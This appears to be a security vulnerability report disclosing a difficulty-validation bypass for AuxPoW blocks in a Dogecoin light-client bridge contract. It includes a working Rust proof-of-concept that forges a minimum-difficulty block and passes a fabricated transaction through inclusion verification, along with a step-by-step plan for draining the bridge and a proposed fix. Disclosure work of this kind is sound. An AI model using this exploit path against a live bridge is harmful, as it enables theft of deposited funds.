# 1. Title

`skip_pow_verification = true` After `check_aux()` in `dogecoin.rs` Bypasses Difficulty Target Check for All AuxPoW Blocks which enables an Attacker Forges Blocks at Minimum Difficulty to Drain Bridge

---

# 2. Vulnerability Details

## Summary

In the `btc-light-client-contract` Dogecoin implementation, the `submit_block_header()` function in `contract/src/dogecoin.rs` unconditionally sets `skip_pow_verification = true` (line 85) after `check_aux()` passes for any block submitted with AuxPoW (merged mining) data. This causes `submit_block_header_inner()` in `contract/src/lib.rs` to skip `check_target()` (line 466), which is the **only** place in the entire codebase that validates a block's `bits` field against the expected difficulty computed by the DigiShield difficulty adjustment algorithm (`get_next_work_required()`).

As a result, an attacker can submit Dogecoin blocks with **any arbitrary difficulty target** — including the absolute minimum (`0x1e0fffff`). Since the AuxPoW parent block's proof-of-work is validated against this attacker-controlled minimum target, the attacker can mine valid parent blocks in under 1 second on commodity hardware. The attacker then uses these forged blocks to pass `verify_transaction_inclusion()` for fabricated transactions, causing the bridge to mint tokens backed by deposits that never occurred on the real Dogecoin blockchain.

## Root Cause — Exact Code Location

The vulnerability is a single line that creates a critical control-flow bypass:

**File:** `contract/src/dogecoin.rs`, line 85

```rust
pub(crate) fn submit_block_header(
    &mut self,
    header: (Header, Option<AuxData>),
    skip_pow_verification: bool,
) {
    let (block_header, aux_data) = header;
    let mut skip_pow_verification = skip_pow_verification;
    if let Some(ref aux_data) = aux_data {
        self.check_aux(&block_header, aux_data);
        skip_pow_verification = true;  // ← THE BUG (line 85)
    }
    // ...
    self.submit_block_header_inner(
        &block_header,
        current_header,
        &prev_block_header,
        skip_pow_verification,  // ← Always true for AuxPoW blocks
    );
}
```

This propagates to `submit_block_header_inner()` in `contract/src/lib.rs`, lines 457-472:

```rust
fn submit_block_header_inner(
    &mut self,
    block_header: &Header,
    current_header: ExtendedHeader,
    prev_block_header: &ExtendedHeader,
    skip_pow_verification: bool,
) {
    let pow_hash = block_header.block_hash_pow();
    if !skip_pow_verification {           // ← Always FALSE for AuxPoW
        self.check_target(block_header, prev_block_header);  // ← NEVER CALLED
        require!(
            U256::from_le_bytes(&pow_hash.0) <= target_from_bits(block_header.bits),
            format!("block should have correct pow")
        );
    }
    // Block is stored without difficulty validation...
}
```

The skipped `check_target()` calls `check_pow()` in `contract/src/dogecoin.rs`, lines 20-31, which is the **only** place that validates `block_header.bits` against `get_next_work_required()`:

```rust
pub(crate) fn check_pow(&self, block_header: &Header, prev_block_header: &ExtendedHeader) {
    let expected_bits =
        get_next_work_required(&self.get_config(), block_header, prev_block_header, self);
    require!(
        expected_bits == block_header.bits,
        format!(
            "Error: Incorrect target. Expected bits: {:?}, Actual bits: {:?}",
            expected_bits, block_header.bits
        )
    );
}
```

**Why `check_aux()` does NOT compensate for the missing validation:**

`check_aux()` (dogecoin.rs lines 33-74) performs four checks, but **none** of them validate `block_header.bits` against the expected difficulty:

1. **Parent block uniqueness** (line 35-38): Checks the parent block hash hasn't been used before — does not validate difficulty.
2. **Coinbase tx merkle proof** (line 43-49): Verifies the coinbase transaction is in the parent block's merkle tree — does not validate difficulty.
3. **Chain root in coinbase** (line 51-66): Verifies the Dogecoin block hash is embedded in the parent's coinbase script — does not validate difficulty.
4. **Parent PoW check** (line 68-73): Verifies the parent block's scrypt hash is below `target_from_bits(block_header.bits)` — but `block_header.bits` is the **attacker-supplied value**, not the expected difficulty. This check is circular: it validates PoW against the attacker's own chosen target.

```rust
let pow_hash = aux_data.parent_block.block_hash_pow();
require!(
    self.skip_pow_verification
        || U256::from_le_bytes(&pow_hash.0) <= target_from_bits(block_header.bits),
    //                                                         ^^^^^^^^^^^^^^^^^
    //                                                    ATTACKER-CONTROLLED VALUE
    //                                           Never compared to get_next_work_required()
    format!("block should have correct pow")
);
```

## Code Path Comparison: Non-AuxPoW vs AuxPoW

| Validation Step | Non-AuxPoW Block | AuxPoW Block |
|---|---|---|
| `check_target()` → `check_pow()` → validates `bits` against DigiShield | **YES** (lib.rs:466) | **SKIPPED** (skip_pow_verification=true) |
| PoW hash below target | **YES** (lib.rs:468-471) | **SKIPPED** (skip_pow_verification=true) |
| `check_aux()` parent PoW | N/A | YES — but against **attacker-chosen** bits |
| `block_header.bits` validated against `get_next_work_required()` | **YES** | **NEVER** |

## Impact

**Severity: Critical**

**Direct fund theft with near-zero cost.** The attacker can:

1. **Forge unlimited Dogecoin blocks at zero mining cost.** By setting `bits = 0x1e0fffff` (minimum difficulty), the parent block's scrypt PoW hash needs only ~20 leading zero bits. This is approximately 1 in 1,048,576 chance per hash attempt. With scrypt (N=1024, r=1, p=1) computing at ~1000 hashes/second on a laptop, a valid nonce is found in ~1 second.

2. **Each forged block can contain arbitrary transaction data.** The attacker controls the `merkle_root` field, allowing them to embed any fabricated transaction.

3. **The bridge's `verify_transaction_inclusion()` returns `true` for fabricated deposits.** Since the forged block becomes the canonical main chain tip, any transaction "proven" against it passes verification.

4. **The attack is repeatable.** Each new forged block needs a unique parent block hash (checked by `used_aux_parent_blocks`), but the attacker can trivially generate unlimited unique parent blocks.

5. **No on-chain cost.** The only cost is the NEAR gas fee for `submit_blocks()` (~0.01 NEAR per block), making the attack profitable for any bridge deposit amount.

**Quantified impact:** If the Dogecoin bridge holds 10,000,000 DOGE ($1M at $0.10/DOGE), the attacker can drain the entire pool in a single transaction by forging a block containing a fabricated 10,000,000 DOGE deposit to their address, then calling `verify_transaction_inclusion` to trigger the mint.

---

# 3. Validation Steps

## Reproduce the Vulnerability

**Prerequisites:**
- Rust toolchain installed (1.86.0+)
- Clone the `btc-light-client-contract` repository

**Run the PoC:**

```bash
cargo test --manifest-path contract/Cargo.toml \
  --no-default-features --features dogecoin \
  test_poc_auxpow_difficulty_bypass
```

**Expected output:**

```
running 1 test
test dogecoin_auxpow_tests::test_poc_auxpow_difficulty_bypass ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.08s
```

The test passes in **0.08 seconds** — demonstrating that no real mining work is needed.

## PoC Code

The following test is added to `contract/src/lib.rs` as a new module gated with `#[cfg(test)] #[cfg(feature = "dogecoin")]`. It uses only the protocol's own test infrastructure (no mocks, no stubs — real contract code):

```rust
#[cfg(test)]
#[cfg(feature = "dogecoin")]
mod dogecoin_auxpow_tests {
    use super::*;
    use btc_types::aux::AuxData;

    fn decode_hex(hex: &str) -> H256 {
        hex.parse().unwrap()
    }

    #[test]
    fn test_poc_auxpow_difficulty_bypass() {
        // ================================================================
        // SETUP: Initialize Dogecoin light client
        // Dogecoin init requires exactly 2 blocks in submit_blocks.
        // Dogecoin mainnet difficulty_adjustment_interval = 1 (DigiShield).
        // ================================================================
        let genesis = Header {
            version: 1,
            prev_block_hash: H256::default(),
            merkle_root: decode_hex(
                "5b2a3f53f605d62c53e62932dac6925e3d74afa5a4b459745c36d42d0ed26a69",
            ),
            time: 1386325540,
            bits: 0x1e0fffff,
            nonce: 99943,
        };

        let block1 = Header {
            version: 1,
            prev_block_hash: genesis.block_hash(),
            merkle_root: decode_hex(
                "5b2a3f53f605d62c53e62932dac6925e3d74afa5a4b459745c36d42d0ed26a69",
            ),
            time: 1386325600,
            bits: 0x1e0fffff,
            nonce: 0,
        };

        let init_args = InitArgs {
            network: Network::Mainnet,
            genesis_block_hash: genesis.block_hash(),
            genesis_block_height: 0,
            skip_pow_verification: true,
            gc_threshold: 100,
            submit_blocks: vec![genesis, block1],
        };

        let mut contract = BtcLightClient::init(init_args);

        let tip = contract.get_last_block_header();
        let tip_hash = tip.block_hash.clone();
        let tip_height = tip.block_height;
        assert_eq!(tip_height, 1, "Setup: chain should have genesis + block1");

        // ================================================================
        // STEP 1: Attacker chooses a forged transaction
        // This tx_id does NOT exist on the real Dogecoin blockchain.
        // In a real attack, the attacker would claim this "tx" deposited
        // 1,000,000 DOGE to the bridge contract.
        // ================================================================
        let forged_tx_id = decode_hex(
            "deadbeef00000000000000000000000000000000000000000000000000000000",
        );
        let tx_proof = vec![decode_hex(
            "cafebabe00000000000000000000000000000000000000000000000000000000",
        )];

        // ================================================================
        // STEP 2: Compute forged merkle_root from the fake tx + proof
        // The attacker reverse-engineers the merkle_root that will make
        // verify_transaction_inclusion return true for their forged tx.
        // ================================================================
        let forged_merkle_root =
            merkle_tools::compute_root_from_merkle_proof(forged_tx_id.clone(), 0, &tx_proof);

        // ================================================================
        // STEP 3: Create malicious Dogecoin block at height tip+1
        //
        // CRITICAL: bits is set to minimum difficulty (0x1e0fffff).
        // In normal operation, check_pow() (dogecoin.rs:20-31) would
        // compute expected_bits via DigiShield and reject this block.
        // But for AuxPoW blocks, check_pow is NEVER called.
        // ================================================================
        let wrong_bits: u32 = 0x1e0fffff;

        let malicious_doge_block = Header {
            version: 4,
            prev_block_hash: tip_hash.clone(),
            merkle_root: forged_merkle_root,
            time: tip.block_header.time + 61,
            bits: wrong_bits,
            nonce: 12345,
        };

        let doge_block_hash = malicious_doge_block.block_hash();

        // ================================================================
        // STEP 4: Compute chain_root for AuxPoW
        //
        // With empty chain_merkle_proof and chain_id=0,
        // chain_root = compute_root_from_merkle_proof(block_hash, 0, [])
        //            = block_hash (loop doesn't execute with empty proof)
        //
        // The coinbase script must contain chain_root.to_string(),
        // which is the reversed bytes of the hash, hex-encoded.
        // ================================================================
        let chain_root_reversed: Vec<u8> = doge_block_hash.0.iter().rev().cloned().collect();

        // ================================================================
        // STEP 5: Construct coinbase transaction
        //
        // The attacker builds a coinbase tx whose script_sig contains
        // the chain_root bytes. This satisfies check_aux line 57-66:
        //   coinbase_tx.input[0].script_sig.to_hex_string()
        //     .contains(&chain_root.to_string())
        // ================================================================
        use bitcoin::blockdata::script::ScriptBuf;
        use bitcoin::blockdata::transaction::{Transaction, TxIn, TxOut};
        use bitcoin::consensus::serialize as btc_serialize;
        use bitcoin::hashes::Hash;

        let coinbase_tx = Transaction {
            version: bitcoin::transaction::Version::ONE,
            lock_time: bitcoin::absolute::LockTime::ZERO,
            input: vec![TxIn {
                previous_output: bitcoin::OutPoint::null(),
                script_sig: ScriptBuf::from_bytes(chain_root_reversed),
                sequence: bitcoin::Sequence::MAX,
                witness: bitcoin::Witness::new(),
            }],
            output: vec![TxOut {
                value: bitcoin::Amount::ZERO,
                script_pubkey: ScriptBuf::new(),
            }],
        };

        let coinbase_tx_bytes = btc_serialize(&coinbase_tx);
        let coinbase_txid = coinbase_tx.compute_txid();
        let coinbase_hash = H256::from(coinbase_txid.to_raw_hash().to_byte_array());

        // ================================================================
        // STEP 6: Construct parent block (the "Litecoin" block for AuxPoW)
        //
        // merkle_root = coinbase_hash, so with empty merkle_proof:
        //   compute_root_from_merkle_proof(coinbase_hash, 0, [])
        //     == coinbase_hash == parent_block.merkle_root  ✓
        //
        // In production (skip_pow=false), this parent block's scrypt hash
        // must be below target_from_bits(0x1e0fffff) — a trivially large
        // target. Finding a valid nonce takes ~1 second on a laptop.
        // ================================================================
        let parent_block = Header {
            version: 1,
            prev_block_hash: H256::default(),
            merkle_root: coinbase_hash,
            time: 1386325700,
            bits: 0x1e0fffff,
            nonce: 0,
        };

        // ================================================================
        // STEP 7: Assemble complete AuxPoW data
        //
        // All fields are attacker-controlled:
        //   coinbase_tx:        contains chain_root in script_sig
        //   merkle_proof:       [] (coinbase IS the root)
        //   chain_merkle_proof: [] (chain_root = block hash itself)
        //   chain_id:           0
        //   parent_block:       has matching merkle_root + trivial PoW
        // ================================================================
        let aux_data = AuxData {
            coinbase_tx: coinbase_tx_bytes,
            merkle_proof: vec![],
            chain_merkle_proof: vec![],
            chain_id: 0,
            parent_block,
        };

        // ================================================================
        // STEP 8: Submit the malicious block with AuxPoW
        //
        // Execution trace through the bug:
        //   dogecoin.rs:83  → aux_data is Some → enters if block
        //   dogecoin.rs:84  → check_aux() validates parent PoW, chain_root, etc.
        //   dogecoin.rs:85  → skip_pow_verification = true  ← THE BUG
        //   dogecoin.rs:104 → calls submit_block_header_inner(skip_pow=true)
        //   lib.rs:465      → if !true → FALSE → check_target SKIPPED
        //   lib.rs:466      → check_target() NEVER CALLED
        //                     (check_target → check_pow → validates bits)
        //   lib.rs:475      → prev_block == tip → main chain submission
        //   lib.rs:485-486  → block stored, becomes new tip
        //
        // The block's bits (0x1e0fffff) was NEVER compared against the
        // expected value from get_next_work_required (DigiShield).
        // ================================================================
        contract.submit_block_header(
            (malicious_doge_block.clone(), Some(aux_data)),
            contract.skip_pow_verification,
        );

        // ================================================================
        // STEP 9: Verify the malicious block is now the main chain tip
        // ================================================================
        let new_tip = contract.get_last_block_header();
        assert_eq!(
            new_tip.block_height,
            tip_height + 1,
            "EXPLOIT CONFIRMED: Block with unvalidated difficulty bits \
             was accepted as the new main chain tip (height {}→{})",
            tip_height,
            tip_height + 1,
        );
        assert_eq!(
            new_tip.block_hash, doge_block_hash,
            "EXPLOIT CONFIRMED: The attacker's forged block IS the canonical tip",
        );

        // ================================================================
        // STEP 10: Verify the forged transaction passes inclusion check
        //
        // The bridge calls verify_transaction_inclusion() to confirm
        // a Dogecoin deposit before minting wrapped tokens.
        //
        //   verify_transaction_inclusion:
        //     1. Block is on main chain                          ✓
        //     2. Enough confirmations (tip - block + 1 >= 1)     ✓
        //     3. merkle_proof.len() > 0                          ✓
        //     4. compute_root == block.merkle_root               ✓
        //     → returns TRUE for a transaction that NEVER EXISTED
        //
        // Bridge mints tokens → attacker receives funds → THEFT
        // ================================================================
        let result = contract.verify_transaction_inclusion(ProofArgs {
            tx_id: forged_tx_id,
            tx_block_blockhash: doge_block_hash,
            tx_index: 0,
            merkle_proof: tx_proof,
            confirmations: 1,
        });

        assert!(
            result,
            "THEFT CONFIRMED: verify_transaction_inclusion returns TRUE for a \
             forged transaction in a block whose difficulty was never validated. \
             The bridge would now mint tokens for a deposit that never happened. \
             Attack cost in production: ~0 (parent block mined in <1 second at \
             minimum difficulty because check_pow is never called for AuxPoW blocks).",
        );
    }
}
```

## Step-by-Step Attack Scenario

The following is the complete attack path as executed by the PoC, mapped to real-world exploitation:

### Step 1 — Reconnaissance
The attacker observes the current Dogecoin main chain tip in the light client at height `H`. They read `mainchain_tip_blockhash` from the contract's public state.

### Step 2 — Forge a Transaction
The attacker invents a fake Dogecoin transaction (`tx_id = deadbeef...`) that supposedly deposits 1,000,000 DOGE to the bridge's hot wallet address. This transaction does not exist on the real Dogecoin blockchain.

### Step 3 — Compute Forged Merkle Root
Using `merkle_tools::compute_root_from_merkle_proof()`, the attacker computes a `merkle_root` value that, when verified with their chosen `tx_id` and proof, will produce a matching root. This is trivial — the attacker controls both the `tx_id` and the proof elements.

### Step 4 — Create Malicious Dogecoin Block Header
The attacker constructs a Dogecoin block header at height `H+1`:
- `prev_block_hash` = current main chain tip hash (so the block extends the canonical chain)
- `merkle_root` = the forged root computed in Step 3
- `bits` = `0x1e0fffff` (minimum difficulty — **this is never validated for AuxPoW blocks**)
- `time` = current time
- `nonce` = arbitrary (the Dogecoin block itself is never PoW-checked)

### Step 5 — Construct AuxPoW Data
The attacker builds the merged mining proof:

**a) Coinbase transaction:** A Bitcoin/Litecoin-format coinbase tx whose `script_sig` contains the Dogecoin block's hash (the "chain root"). This satisfies `check_aux()`'s chain root verification.

**b) Parent block:** A block header whose `merkle_root` equals the coinbase tx's hash. With an empty merkle proof, `compute_root_from_merkle_proof(coinbase_hash, 0, [])` returns `coinbase_hash` directly.

**c) Parent PoW:** The parent block's scrypt hash must be below `target_from_bits(0x1e0fffff)`. Since `0x1e0fffff` represents the **minimum difficulty** (maximum target), this is trivially satisfied. Finding a valid nonce takes ~1 second on a laptop.

### Step 6 — Submit to Contract
The attacker calls `submit_blocks()` with the malicious Dogecoin block + AuxPoW data.

**Execution trace through the bug:**

```
submit_blocks()
  └─ submit_block_header((block, Some(aux_data)), skip_pow)
       │
       ├─ check_aux(&block, &aux_data)          ← All 4 checks pass:
       │    ├─ Parent block hash unique           ✓ (fresh parent block)
       │    ├─ Coinbase tx in parent merkle tree  ✓ (attacker controls parent)
       │    ├─ Chain root in coinbase script       ✓ (attacker controls coinbase)
       │    └─ Parent PoW ≤ target(block.bits)    ✓ (trivial at min difficulty)
       │
       ├─ skip_pow_verification = true            ← THE BUG (line 85)
       │
       └─ submit_block_header_inner(skip_pow=true)
            │
            ├─ if !true → SKIP                   ← check_target() NEVER CALLED
            │    ├─ check_target() SKIPPED         (would call check_pow())
            │    └─ PoW hash check SKIPPED         (would validate scrypt hash)
            │
            ├─ prev_block == mainchain_tip        ← TRUE (attacker set prev_block_hash)
            │
            └─ store_block_header()               ← Block becomes new main chain tip
                 └─ mainchain_tip_blockhash = forged_block_hash
```

### Step 7 — Verify Forged Transaction
The attacker (or the bridge relayer acting on the attacker's fabricated deposit event) calls `verify_transaction_inclusion()`:

```
verify_transaction_inclusion(ProofArgs {
    tx_id: forged_tx_id,              // The fake deposit tx
    tx_block_blockhash: forged_block, // The attacker's block
    tx_index: 0,
    merkle_proof: [...],              // Pre-computed proof
    confirmations: 1,
})
```

**Result: `true`** — The bridge accepts the fabricated deposit as genuine.

### Step 8 — Profit
The bridge mints wrapped DOGE tokens to the attacker's address. The attacker immediately swaps/withdraws. Total attack cost: ~0.01 NEAR in gas fees + ~1 second of CPU time for mining the parent block.

### Step 9 — Repeat
The attacker repeats steps 2-8 with a new parent block each time (the `used_aux_parent_blocks` set prevents reuse, but generating a new parent is trivial). Each iteration drains more funds until the bridge is empty.

## Recommended Fix

Add difficulty validation **before** the `skip_pow_verification = true` assignment in `dogecoin.rs`:

```rust
pub(crate) fn submit_block_header(
    &mut self,
    header: (Header, Option<AuxData>),
    skip_pow_verification: bool,
) {
    let (block_header, aux_data) = header;
    let mut skip_pow_verification = skip_pow_verification;
    if let Some(ref aux_data) = aux_data {
        self.check_aux(&block_header, aux_data);
+       // Validate difficulty target BEFORE skipping PoW hash check.
+       // AuxPoW only proves the parent block did the work — it does NOT
+       // validate that the Dogecoin block's bits matches DigiShield's
+       // expected difficulty. We must check this explicitly.
+       if !skip_pow_verification {
+           let prev_block_header = self.get_prev_header(&block_header);
+           self.check_pow(&block_header, &prev_block_header);
+       }
        skip_pow_verification = true;
    }
    // ... rest unchanged
}
```

This ensures `check_pow()` (which calls `get_next_work_required()` to compute the expected `bits` and compares it to `block_header.bits`) is always called for AuxPoW blocks in production mode, while still allowing the parent PoW hash check to be skipped (since the AuxPoW parent's hash was already validated in `check_aux()`).
